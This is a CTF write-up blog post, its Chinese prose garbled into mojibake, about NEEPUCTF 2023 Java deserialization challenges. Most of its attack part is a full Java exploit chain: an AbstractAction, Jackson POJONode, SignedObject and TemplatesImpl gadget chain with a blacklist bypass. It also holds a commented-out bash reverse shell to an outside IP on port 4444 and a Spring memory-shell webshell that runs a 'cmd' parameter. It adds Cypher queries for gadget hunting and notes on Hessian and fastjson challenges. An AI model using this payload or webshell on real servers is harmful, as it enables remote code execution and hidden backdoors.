---
layout: post
title: NEEPUCTF2023 javaé¢˜
categories: [blog ]
tags: [Java,]
description: ""
image:
  feature: windows.jpg
  credit: JYcxk
  creditlink: shzqi
---



```java
æœ€è¿‘çš„é¢˜ç›®å¤ç°ï¼Œéƒ½æ˜¯åœ¨æˆ‘çš„SCTFè¿™ä¸ªé¡¹ç›®ä¸­åšçš„ï¼Œå¤ªniceäº†
C:\Users\c'x'k\Desktop\java\shiro\SCTFjava
```

## å‰è¨€ï¼ˆNo Map)

```java
å¤ç°æœ¬ç¯‡æ–‡ç« æ˜¯å› ä¸ºå‘ç° å®‰æ’11æœˆèµ›çš„javaé¢˜çš„é“¾å­å°±æ˜¯ä»è¿™é“é¢˜ç”±âœŒä»¬äº§ç”Ÿçš„ï¼ŒAbstractActionè¿™ä¸ª
```

https://github.com/R1ckyZ/My-CTF-Challenges é™„ä»¶é“¾æ¥ï¼ˆå½“æ—¶æ‰¾äº†å¥½ä¹…å¥½ä¹…

æ­å»ºè¿™é“é¢˜ç¯å¢ƒçš„æ—¶å€™å°±æ„Ÿè§‰å¾ˆæœ‰é—®é¢˜ï¼ŒäºŒä¸ªå®¹å™¨idå’¦

![image-20231130190702581](..\img\final\image-20231130190702581.png)

ä¾èµ–

```java
jackson 2.13.2
snakeyaml 1.29
spring-boot 2.6.7
```

### ä»£ç éå¸¸çš„ç®€æ´å°±ä¸€ä¸ªååºåˆ—åŒ–ä¸€ä¸ªé»‘åå•

```java
public class MainController {
    @RequestMapping({"/"})
    @ResponseBody
    public String status() {
        return "Welcome to NEEPUCTF 2023 :D";
    }

    @RequestMapping({"/nomap"})
    @ResponseBody
    public String noMap(HttpServletRequest request) {
        try {
            MyObjectInputStream ois = new MyObjectInputStream(request.getInputStream());
            String name = ois.readUTF();
            int year = ois.readInt();
            if (name.equals("NEEPU") && year == 1949) {
                ois.readObject();
            }
            return "No map to deserialize XD";
        } catch (Exception var3) {
            var3.printStackTrace();
            return "No map to deserialize XD";
        }
    }
}
```

```java
public class MyObjectInputStream extends ObjectInputStream {
    private static final String[] blacklist = {"bsh", "clojure", "java.util", "javax.management", "java.rmi", "com.sun.jndi", "sun.rmi", "org.apache", "org.hibernate", "org.springframework", "com.mchange.v2.c3p0", "com.rometools.rome.feed.impl", "com.alibaba.fastjson", "java.net.URL", "java.lang.reflect.Proxy", "javax.xml.transform.Templates", "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl", "org.apache.xalan.xsltc.trax.TemplatesImpl", "org.python.core", "com.mysql.jdbc", "org.jboss"};

    public MyObjectInputStream(InputStream in) throws IOException {
        super(in);
    }

    protected MyObjectInputStream() throws IOException, SecurityException {
    }

    @Override // java.io.ObjectInputStream
    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        String className = desc.getName();
        for (String forbiddenPackage : blacklist) {
            if (className.startsWith(forbiddenPackage)) {
                throw new InvalidClassException("Unauthorized deserialization attempt", className);
            }
        }
        return super.resolveClass(desc);
    }
}
```

javax.management ã€java.utilè¿™ä¿©ç±»ä¸€ç¦ç”¨åºåˆ—åŒ–çš„éƒ½æ²¡äº†ã€‚è¿˜å¥½æ˜¨å¤©å¤ç°äº†é‚£ä¸ªé¢˜

ç”¨AbstractActioné“¾å­ç›´æ¥èƒ½è§¦å‘getteræ–¹æ³•ï¼Œåªä¸è¿‡è¿™é‡ŒTemplatesä¹Ÿè¢«ç¦äº†ï¼Œé‚£ç›´æ¥è§¦å‘signObjectæ‰“äºŒæ¬¡ååºåˆ—åŒ–

ï¼ˆåˆ°è¿™é‡Œæœ‰äº†ä¸ªç–‘é—®ï¼ŒäºŒæ¬¡ååºåˆ—åŒ–èƒ½ç»•è¿‡è¿™ä¸ªè¿‡æ»¤å˜›ï¼‰

å•¥èƒ½ä¸èƒ½ä½ ä¸å®éªŒæ€ä¹ˆçŸ¥é“ï¼Ÿï¼Ÿï¼Ÿç›´æ¥å¼€è°ƒè¯•

AbstractAction#readObject----?XString#equals---->jackson#toString--->signObject#getObject  

è¿™é‡Œæœ€ååˆ°è¾¾ signObjectçš„readObjectï¼Œç„¶ååé¢éšä¾¿æ‰“ä¸€ä¸ªbadattributeé“¾å­ä¸çŸ¥é“ä¼šä¸ä¼šè¢«è¿‡æ»¤



é“¾å­æ„é€ å®Œäº†æ¥ä¸‹æ¥å§é»‘åå•å¸¦å…¥çœ‹ä¸€ä¸‹

![image-20231130202335366](..\img\final\image-20231130202335366.png)

ç›´æ¥é€šäº†å¾ˆç¥å¥‡

ç¬¬ä¸€æ¬¡ååºåˆ—åŒ–

```java
```

è¿™æ˜¯äºŒæ¬¡ååºåˆ—åŒ–åçš„éƒ¨åˆ†

![image-20231130202248662](..\img\final\image-20231130202248662.png)

![image-20231130211450492](..\img\final\image-20231130211450492.png)

å°±åœ¨æˆ‘æœ¬åœ°ideaä¸­é€šäº†ï¼Œä½†æ‰“jaråŒ…æ­»æ´»æ‰“ä¸é€šæˆ‘çœŸçš„æœå•¦ï¼Œå°±åœ¨æˆ‘ä»¥ä¸ºæ˜¯æˆ‘è‡ªå·±çš„é—®é¢˜çš„æ—¶å€™

tnndé€šäº†ï¼Œé¡¿æ—¶æ˜ç™½äº†jacksoné“¾å­å°±æœ‰ä¸ç¨³å®šçš„é—®é¢˜ï¼ˆè®°å¾—åœ¨å¤ç°DASCTF10æœˆæ–‡ç« æœˆèµ›RASPé‚£é“é¢˜è®°å½•è¿‡ï¼‰

![image-20231130211729645](..\img\final\image-20231130211729645.png)

å®Œå–„è¿‡åå°±å¥½ç”¨å¤šäº†ï¼ˆä½†æ˜¯å‘ç°ç”¨âœŒä»¬ç›´æ¥åœ¨ideaä¸­ç”¨postä¼ å‚ï¼Œè²Œä¼¼ä¼ ä¸ä¸Šå»ï¼Œè¿˜å¾—æ˜¯pyï¼‰

![image-20231130212843246](..\img\final\image-20231130212843246.png)

æœ€åçš„payload

å…ˆåºåˆ—åŒ–ç„¶å010æ”¹ä¸€ä¸‹ï¼Œåœ¨ä¸Šä¼ 

```java
package example.demo.controller;


import com.example.ezfastjson.MemShell;
import com.example.ezfastjson.Threada;
import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import javassist.*;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.ResponseEntity;
import org.springframework.web.client.RestTemplate;

import javax.management.BadAttributeValueExpException;
import javax.swing.event.SwingPropertyChangeSupport;
import javax.swing.text.StyledEditorKit;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.net.URI;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.SignedObject;
import java.util.Base64;

public class payload {
    private static String string;
    public static void main(String[] args) throws Exception {
        TemplatesImpl templatesImpl = (TemplatesImpl)getTemplatesImpl();

        Class<?> clazz = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
        Constructor<?> cons = clazz.getDeclaredConstructor(AdvisedSupport.class);
        cons.setAccessible(true);
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(templatesImpl);
        InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport);
        Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler);
        POJONode pojoNode2=new POJONode(proxyObj);


        BadAttributeValueExpException exp2 = new BadAttributeValueExpException(null);
        Field val2 = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
        val2.setAccessible(true);
        val2.set(exp2,pojoNode2);


        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        SignedObject signedObject = new SignedObject(exp2, kp.getPrivate(), Signature.getInstance("DSA"));
        XString xString=new XString("aa");

        POJONode pojoNode=new POJONode(signedObject);

        //xString.equals(pojoNode);




        StyledEditorKit.AlignmentAction action=new StyledEditorKit.AlignmentAction("age",1);
        action.putValue("JYcxk1",xString);
        action.putValue("JYcxk2",pojoNode);

        Class<?> aClass = Class.forName("javax.swing.AbstractAction");
        Field changeSupport = aClass.getDeclaredField("changeSupport");
        changeSupport.setAccessible(true);
        changeSupport.set(action,new SwingPropertyChangeSupport(""));


        //serialize(action);
        FileInputStream fileInputStream=new FileInputStream("ser.bin");
        byte[] bytes=new byte[fileInputStream.available()];
        doPOST(bytes);
        fileInputStream.read(bytes);
        System.out.println(Base64.getEncoder().encodeToString(bytes));

      // unserialize("ser.bin");


    }
    public static Object getTemplatesImpl() throws IOException, NoSuchFieldException, IllegalAccessException, NotFoundException, CannotCompileException {
        TemplatesImpl templates=new TemplatesImpl();
       // byte[] evilBytes=getEvilBytes();
        setFieldValue(templates,"_name","JYcxk");
        setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());

        setFieldValue(templates, "_bytecodes",
                new byte[][]{ClassPool.getDefault().get(Threada.class.getName()).toBytecode()}
        );

     //  setFieldValue(templates,"_bytecodes",new byte[][]{evilBytes});
        return templates;

    }
    public static void setFieldValue(Object object,String field_name,Object filed_value) throws NoSuchFieldException, IllegalAccessException {
        Class clazz=object.getClass();
        Field declaredField=clazz.getDeclaredField(field_name);
        declaredField.setAccessible(true);
        declaredField.set(object,filed_value);
    }
    public static byte[] getEvilBytes() throws NotFoundException, CannotCompileException, IOException, NotFoundException, CannotCompileException, NotFoundException, CannotCompileException {
        ClassPool classPool = new ClassPool(true);
        CtClass hello = classPool.makeClass("Hello");
        CtClass ctClass = classPool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        hello.setSuperclass(ctClass);
        CtConstructor ctConstructor=new CtConstructor(new CtClass[]{},hello);
        ctConstructor.setBody("java.lang.Runtime.getRuntime().exec(\"calc\");");
       // ctConstructor.setBody("java.lang.Thread.sleep(99.2);");

        //ctConstructor.setBody("java.lang.Runtime.getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",\"bash -i >& /dev/tcp/101.42.224.57/4444 0>&1\"});");
        //ctConstructor.setBody("Runtime.getRuntime().exec(new String[]{\"/bin/bash\", \"-c\", \"mkdir /me/jycxk/Desktop/sfsfs\"});");
        hello.addConstructor(ctConstructor);
        byte[] bytes=hello.toBytecode();
        hello.detach();


//        byte[] bytes = ClassPool.getDefault().get("com.sad.controller.SpringInterceptor").toBytecode();
        return bytes;

    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        objectOutputStream.writeUTF("NEEPU");
        objectOutputStream.writeInt(1949);

        objectOutputStream.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream = new MyObjectInputStream(new FileInputStream(Filename));
        System.out.println(objectInputStream.readUTF());
        System.out.println(objectInputStream.readInt());

        return objectInputStream.readObject();
    }
    public static void doPOST(byte[] obj) throws Exception{
        HttpHeaders requestHeaders = new HttpHeaders();
        requestHeaders.set("Content-Type", "text/plain");
       // URI url = new URI("http://neepusec.fun:27010/nomap");
        //URI url = new URI("http://8.130.116.247:8090/nomap");
        URI url = new URI("http://127.0.0.1:8090/nomap");
        //URI url = new URI("http://localhost:8080/bypassit");
        HttpEntity<byte[]> requestEntity = new HttpEntity <> (obj,requestHeaders);

        RestTemplate restTemplate = new RestTemplate();
        ResponseEntity<String> res = restTemplate.postForEntity(url, requestEntity, String.class);
        System.out.println(res.getBody());
    }
}
```

å†…å­˜é©¬

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;

public class InjectToController extends AbstractTranslet {

    // ç¬¬ä¸€ä¸ªæ„é€ å‡½æ•°
    public InjectToController() throws ClassNotFoundException, IllegalAccessException, NoSuchMethodException, NoSuchFieldException, InvocationTargetException, InstantiationException {
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        // 1. ä»å½“å‰ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­è·å¾— RequestMappingHandlerMapping çš„å®ä¾‹ bean
        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
        Field configField = mappingHandlerMapping.getClass().getDeclaredField("config");
        configField.setAccessible(true);
        RequestMappingInfo.BuilderConfiguration config =(RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);
        Method method2 = InjectToController.class.getMethod("test");
        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
        RequestMappingInfo info = RequestMappingInfo.paths("/Flag")
                .options(config)
                .build();
        InjectToController springControllerMemShell = new InjectToController("aaa");
        mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2);
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    // ç¬¬äºŒä¸ªæ„é€ å‡½æ•°
    public InjectToController(String aaa) {}

    // controlleræŒ‡å®šçš„å¤„ç†æ–¹æ³•
    public void test() throws  IOException{
        // è·å–requestå’Œresponseå¯¹è±¡
        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();

        //exec
        try {
            String arg0 = request.getParameter("cmd");
            PrintWriter writer = response.getWriter();
            if (arg0 != null) {
                String o = "";
                java.lang.ProcessBuilder p;
                if(System.getProperty("os.name").toLowerCase().contains("win")){
                    p = new java.lang.ProcessBuilder(new String[]{"cmd.exe", "/c", arg0});
                }else{
                    p = new java.lang.ProcessBuilder(new String[]{"/bin/sh", "-c", arg0});
                }
                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter("A");
                o = c.hasNext() ? c.next(): o;
                c.close();
                writer.write(o);
                writer.flush();
                writer.close();
            }else{
                //å½“è¯·æ±‚æ²¡æœ‰æºå¸¦æŒ‡å®šçš„å‚æ•°(code)æ—¶ï¼Œè¿”å› 404 é”™è¯¯
                response.sendError(404);
            }
        }catch (Exception e){}
    }

```



## å°±æ­¤ç¯‡æ–‡ç« è¿›è¡Œä¸€ä¸ªtabbyçš„åˆ†æ

ä»ä¸Šé¢å¯çŸ¥æˆ‘ä»¬XString#equals--->jackson#tostring

åªæœ‰ä»readObject--->equalsæˆ–è€… readObject--->toString è¿™ç‚¹é“¾å­æ˜¯æ‰¾ä¸åˆ°çš„ï¼Œåé¢éƒ½æ˜¯å›ºå®šçš„

```java
match (source:Method {NAME:"readObject",CLASSNAME:"java.util.HashMap"})
match (sink:Method {NAME0:"com.example.b4bycoffee.model.CoffeeBean.toString"})<-[:CALL]-(m1:Method)
call apoc.algo.allSimplePaths(m1, source, "<CALL|ALIAS", 20) yield path 
return * limit 20
```

```java
match (source:Method {NAME:"readObject"})
match (sink:Method {NAME:"toString"})<-[:CALL]-(m1:Method)
call apoc.algo.allSimplePaths(m1, source, "<CALL|ALIAS", 6) yield path 
return * limit 10
```



ä¸‹é¢è¿™æ¡è¯­å¥å°±ä¼šæ‰¾åˆ°AbstrActionè¿™ä¸ªç±»çš„é“¾å­äº†

```java
match (source:Method) where source.NAME in ["readObject"]
match (sink:Method {NAME:"toString"})<-[r:CALL]-(m1:Method) where r.REAL_CALL_TYPE in ["java.lang.Object"]
  //r.REAL_CALL_TYPE å•¥æ„æ€ï¼Ÿè¡¨mainæ˜¯è°ƒç”¨äº†è¿™ä¸ªç±»
call apoc.algo.allSimplePaths(m1, source, "<CALL|ALIAS", 6) yield path
    //6æ˜¯å•¥æ„æ€ï¼Ÿ
    
 where none(n in nodes(path) where (n.CLASSNAME =~ "javax.management.*" or n.CLASSNAME =~ "com.alibaba.fastjson.*" or n.CLASSNAME =~"java.uti.*" or n.CLASSNAME =~"com.sun.jndi.*" or n.CLASSNAME =~"sun.rmi.*" or n.CLASSNAME=~"java.net.URL.*" or n.CLASSNAME=~"java.io.*" or n.CLASSNAME=~"java.math.BigDecimal" or n.CLASSNAME=~"com.sun.javafx.*" or n.CLASSNAME=~"java.awt.*" or n.CLASSNAME=~"javax.swing.tree.DefaultTreeCellEditor" or n.CLASSNAME=~"com.sun.deploy.cache.*" or n.CLASSNAME=~"javax.security.auth.kerberos.KerberosPrincipal" or n.CLASSNAME=~"javax.crypto.SealedObject" or n.CLASSNAME=~"javax.sql.rowset.serial.SerialArray" or n.CLASSNAME=~"org.yaml.snakeyaml.events.Event" or n.CLASSNAME=~"sun.jvm.hotspot.utilities.ObjectReader" or n.CLASSNAME=~"javax.swing.ArrayTable" or n.NAME=~"clone" or n.CLASSNAME=~"javax.swing.text.DefaultStyledDocument" or n.CLASSNAME=~"javax.swing.tree.DefaultTreeSelectionModel" or n.CLASSNAME=~"java.beans.beancontext.BeanContextSupport" or n.CLASSNAME=~"sun.security.pkcs.PKCS8Key" or n.CLASSNAME=~"sun.font.FontDesignMetrics"))
    //ä»¥sun.font.FontDesignMetricså¼€å¤´çš„ï¼Œ~æ˜¯ä¸€ä¸ªæ­£åˆ™åŒ¹é…
    //ä¸Šé¢çš„è¿™äº›ç±»å°±ç›¸å½“äºé»‘åå•ï¼Œè·¯å¾„è°ƒè¯•ä¸è¿›å»å°±åŠ å…¥è¿›å»æŠŠé‚£ä¸ªç±»
return * limit 10
```

```java
match (source:Method) where source.NAME0 in ["javax.swing.readObject"]
```

æœ¬æ¥æ˜¯æ‰¾ä¸åˆ°AbstractActionè¿™ä¸ªç±»çš„ï¼Œæ”¹äº†ä¸€ä¸ªé…ç½®ï¼ŒæŠŠwithAllJDKæ”¹ä¸ºtrueå³å¯

è¿™æ˜¯è¾¹çš„å±æ€§ï¼Œå¯ä»¥çœ‹åˆ°æœ‰REAL_CALL_TYPE è°ƒç”¨çš„ç±»å‹

![image-20231203164124116](..\img\final\image-20231203164124116.png)

å»æ‰é‚£ä¸ªREAL_CALL_TYPEä¹Ÿæ˜¯å¯ä»¥çš„åªä¸è¿‡æŸ¥è¯¢çš„æ¯”è¾ƒæ…¢

```java
match (source:Method {NAME:"readObject"})
match (sink:Method {NAME:"toString"})<-[:CALL]-(m1:Method)
call apoc.algo.allSimplePaths(m1, source, "<CALL|ALIAS", 6) yield path 
where none(n in nodes(path) where (n.CLASSNAME =~ "javax.management.*" or n.CLASSNAME =~ "com.alibaba.fastjson.*" or n.CLASSNAME =~"java.uti.*" or n.CLASSNAME =~"com.sun.jndi.*" or n.CLASSNAME =~"sun.rmi.*" or n.CLASSNAME=~"java.net.URL.*" or n.CLASSNAME=~"java.io.*" or n.CLASSNAME=~"java.math.BigDecimal" or n.CLASSNAME=~"com.sun.javafx.*" or n.CLASSNAME=~"java.awt.*" or n.CLASSNAME=~"javax.swing.tree.DefaultTreeCellEditor" or n.CLASSNAME=~"com.sun.deploy.cache.*" or n.CLASSNAME=~"javax.security.auth.kerberos.KerberosPrincipal" or n.CLASSNAME=~"javax.crypto.SealedObject" or n.CLASSNAME=~"javax.sql.rowset.serial.SerialArray" or n.CLASSNAME=~"org.yaml.snakeyaml.events.Event" or n.CLASSNAME=~"sun.jvm.hotspot.utilities.ObjectReader" or n.CLASSNAME=~"javax.swing.ArrayTable" or n.NAME=~"clone" or n.CLASSNAME=~"javax.swing.text.DefaultStyledDocument" or n.CLASSNAME=~"javax.swing.tree.DefaultTreeSelectionModel" or n.CLASSNAME=~"java.beans.beancontext.BeanContextSupport" or n.CLASSNAME=~"sun.security.pkcs.PKCS8Key" or n.CLASSNAME=~"sun.font.FontDesignMetrics" or n.CLASSNAME=~"java.lang.Throwable.*"))
return * limit 9
```

![image-20231203165951184](..\img\final\image-20231203165951184.png)



## æ˜¯ä¸æ˜¯æœ‰Bean

åšè¿™é“é¢˜ä¹‹å‰ï¼Œå…ˆè¦åšä¸€ä¸‹D^3CTFé‚£é“é¢˜å…ˆæ¶¦äº†æ—¥åè§

ï¼ˆå’¦ï¼Œ12.9æˆ‘æ¶¦å›æ¥äº†å‘œå‘œå‘œï¼Œä¹Ÿå°±ä¸€ä¸ªæ˜ŸæœŸä¸·ï¼‰

é¢˜ç›®åå­—ï¼šezjavaï¼ˆğŸ˜¢ğŸ˜¢è¿™ä¸ªåå­—çš„å«é‡‘é‡åº”è¯¥å°±ä¸ç”¨è¯´äº†å…«ï¼ŒD3CTFé¢˜çš„åå­—ä¹Ÿæ˜¯ezjava)

é¦–å…ˆæŸ¥çœ‹ä¾èµ–

```java
com.alipay.sofa hessian  3.3.13
snakkeyaml-1.25    
```

è¿˜æœ‰ä¸€å †çš„é»‘åå•ï¼Œå¤§æ¦‚çœ‹äº† å¸¸ç”¨çš„éƒ½ç¦ç”¨äº†è¿˜æœ‰äºŒæ¬¡ååºåˆ—åŒ–ä¹Ÿç¦ç”¨äº†ï¼Œä½†æ˜¯å…³äºhessiançš„éƒ½è¿˜åœ¨

![image-20231209182353940](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231209182353940.png)

ç»™å‡ºäº†å‡ ä¸ªç±»ï¼Œé¦–å…ˆåˆ†æä¸€ä¸‹åŠŸèƒ½

#### Blacklist

```java
public class Blacklist {
    public static List<String> hessianBlackList = readList("security/YouAreBadBad.txt");//è¯»å–é»‘åå•åˆ—è¡¨
    public static List<String> readList(String blackListFile) {
        ArrayList<String> result = new ArrayList<>();
        InputStream inputStream = Thread.currentThread().getContextClassLoader().getResourceAsStream(blackListFile);//è¯»å–ä¼ å…¥å‚æ•°è·¯å¾„çš„å†…å®¹
        if (inputStream == null) {
            return result;
        }
        Scanner scanner = null;
        try {
            scanner = new Scanner(inputStream);
            while (scanner.hasNextLine()) {
                String nextLine = scanner.nextLine();
                if (!isDeny(nextLine)) {//å»æ‰ç©ºæ ¼ tab æ¢è¡Œ
                    result.add(nextLine);
                }
            }
            return result;
        } catch (Exception e) {
            if (scanner == null) {
                return result;
            }
            scanner.close();
            return result;
        }
    }

    static boolean isDeny(String cs) {
        int strLen;
        if (cs == null || (strLen = cs.length()) == 0) {
            return true;
        }
        for (int i = 0; i < strLen; i++) {
            if (!Character.isWhitespace(cs.charAt(i))) {
                return false;
            }
        }
        return true;
    }
}
```

#### SafeInvoker

```java
public class SafeInvoker extends InvokePipeline {
    private int hashCode;
    public Object doInvoke(String className, String methodName, Object[] args) throws InvalidClassException {
        ClassUtil.checkClassAccess(className);
        //é¦–å…ˆå°†è¾“å…¥çš„ç±»åå’Œé»‘åå•ä¸­åšä¸€ä¸ªåŒ¹é…
        
        try {
            Class clazz = Class.forName(className, true, null);//æ‰§è¡Œç±»çš„æ–¹æ³•å¹¶ä¸”åˆå§‹åŒ–
            if (methodName != null) {
                Method method = clazz.getMethod(methodName, ClassUtil.getClassArray(args));
                method.setAccessible(true);
                return method.invoke(clazz, args);
            }
            Constructor constructor = clazz.getConstructor(ClassUtil.getClassArray(args));
            constructor.setAccessible(true);
            return constructor.newInstance(args);//ç±»çš„æ„é€ æ–¹æ³•æ˜¯æœ‰å‚æ•°çš„
        } catch (Exception e) {
            return null;
        }
    }

    @Override // com.example.ezjava.util.InvokePipeline
    public int hashCode() {
        return this.hashCode;
    }

    public String toString() {
        return "Invoker Method: SafeInvoker";
    }
}
```

#### SafeSerializer

```java
public class SafeSerializer {
    public static Object deserialize(byte[] obj) throws Exception {
        Hessian2Input input = new Hessian2Input(new ByteArrayInputStream(obj));
        ClassNameResolver resolver = new ClassNameResolver();
        resolver.addFilter(new DenyClassFilter());
        SerializerFactory serializerFactory = new SerializerFactory();
        serializerFactory.setAllowNonSerializable(true);
        input.setSerializerFactory(serializerFactory);
        input.getSerializerFactory().setClassNameResolver(resolver);
        return input.readObject();
    }//hessian ååºåˆ—åŒ–ï¼Œä½†æ˜¯ä¹Ÿæ ¡éªŒäº†é»‘åå•

    public static byte[] serialize(Object obj) throws Exception {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        Hessian2Output output = new Hessian2Output(bos);
        output.writeObject(obj);
        output.close();
        return bos.toByteArray();
    }

    /* loaded from: ezjava.jar:BOOT-INF/classes/com/example/ezjava/security/SafeSerializer$DenyClassFilter.class */
    static class DenyClassFilter extends NameBlackListFilter {
        public DenyClassFilter() {
            super(Blacklist.hessianBlackList);
        }
    }
}
```

#### ClassUtil

```java
public class ClassUtil {
    public static void checkClassAccess(String checked) throws InvalidClassException {
        for (String s : Blacklist.hessianBlackList) {
            if (s.equals(checked)) {
                throw new InvalidClassException("show show way");
            }
        }
    }

    public static Class[] getClassArray(Object[] args) {//è·å–çˆ¶ç±»çš„åŠŸèƒ½ï¼Ÿ
        Class[] argClasses = null;
        if (args != null) {
            argClasses = new Class[args.length];
            for (int index = 0; index < args.length; index++) {
                if (args[index] instanceof Integer) {
                    argClasses[index] = Integer.TYPE;
                } else if (args[index] instanceof Boolean) {
                    argClasses[index] = Boolean.TYPE;
                } else if (args[index] instanceof ColorUIResource) {
                    argClasses[index] = Color.class;
                } else {
                    argClasses[index] = args[index].getClass();
                }
            }
        }
        return argClasses;
    }
}
```

#### InvokePipeline

```java
public class InvokePipeline {
    private final int hashCode = -1;

    public boolean check(Object obj, String methodName, Object[] args) throws NoSuchMethodException, InvalidClassException {
        if (obj.getClass().getMethod(methodName, ClassUtil.getClassArray(args)).getReturnType() != Void.TYPE) {
            return false;
        }//è¦å¾€ä¸‹é¢èµ°åˆ™ï¼Œæ–¹æ³•è¿”å›ç±»å‹å¿…é¡»æ˜¯ Void
        return obj.equals(new SafeInvoker().doInvoke(obj.getClass().getName(), methodName, args));
    }//ç„¶åè¿™é‡Œåˆä¼šè°ƒç”¨ equalså’Œè‡ªå®šä¹‰çš„doinvokeæ–¹æ³•

    public int hashCode() {
        return -1;
    }
}
```

æ¯”è¾ƒå¥‡æ€ªçš„æ˜¯æ¯ä¸ªç±»å‡ ä¹éƒ½é‡å†™äº†hashCodeè¿™ä¸ªæ–¹æ³•ï¼Œå°±å¾ˆå®¹æ˜“æƒ³åˆ°HashMap,æ­£å¥½æ²¡ç¦hashmapï¼Œæˆ‘è§‰å¾—è¿™é“é¢˜å°±æ˜¯é€šè¿‡è‡ªå®šä¹‰çš„ç±»å½“ä¸­é—´çš„é“¾å­æ‹¼å‡‘æˆçš„ï¼Œçœ‹äº†çœ‹åŸç”Ÿç±»çš„é“¾å­

![image-20231209195643485](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231209195643485.png)



```java
invoke:275, MethodUtil (sun.reflect.misc)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
createValue:73, SwingLazyValue (sun.swing)   //ç¦ç”¨äº†
getFromHashtable:216, UIDefaults (javax.swing)      
get:161, UIDefaults (javax.swing)                  //ç¦ç”¨äº†
toString:253, MimeTypeParameterList (javax.activation)  //ç¦ç”¨äº†
    
valueOf:2994, String (java.lang)
append:131, StringBuilder (java.lang)
expect:2880, Hessian2Input (com.caucho.hessian.io)
readString:1398, Hessian2Input (com.caucho.hessian.io)
readObjectDefinition:2180, Hessian2Input (com.caucho.hessian.io)
readObject:2122, Hessian2Input (com.caucho.hessian.io)
```

å…¶ä»–çš„ä¹Ÿæ˜¯åŒæ ·éƒ½ç¦äº†ä¸ªç¨€å·´çƒ‚ï¼Œ

















## fastjsoné¢˜ç›®

```java
fastjson 1.2.8
commons-io-2.11.0
junit-jupiter-api-5.8.2
```

å¯ä»¥å‘ç°è¿™é‡Œé¢ï¼Œæ— è®ºæ˜¯å¦ç¬¦åˆæ¡ä»¶éƒ½ä¼šè¿”å›new Resultè¿™ä¸ªä¿¡æ¯ï¼Œæ²¡æœ‰ååºåˆ—åŒ–ï¼Ÿ

```java
public class IndexController {
    @RequestMapping({"/"})
    @ResponseBody
    public String hello() {
        return "Hello, NEEPU CTFer :D";
    }

    @RequestMapping(value = {"/login"}, method = {RequestMethod.POST}, produces = {"application/json;charset=UTF-8"})
    @ResponseBody
    public Object login(@RequestBody User user, HttpServletResponse response) {
        if (!user.getUsername().equals("NEEPU") || !user.getPassword().equals("1949")) {
            return new Result("500", "Wrong username or password :(");
        }
        return new Result("200", "Login Success XD");
    }
}
```



























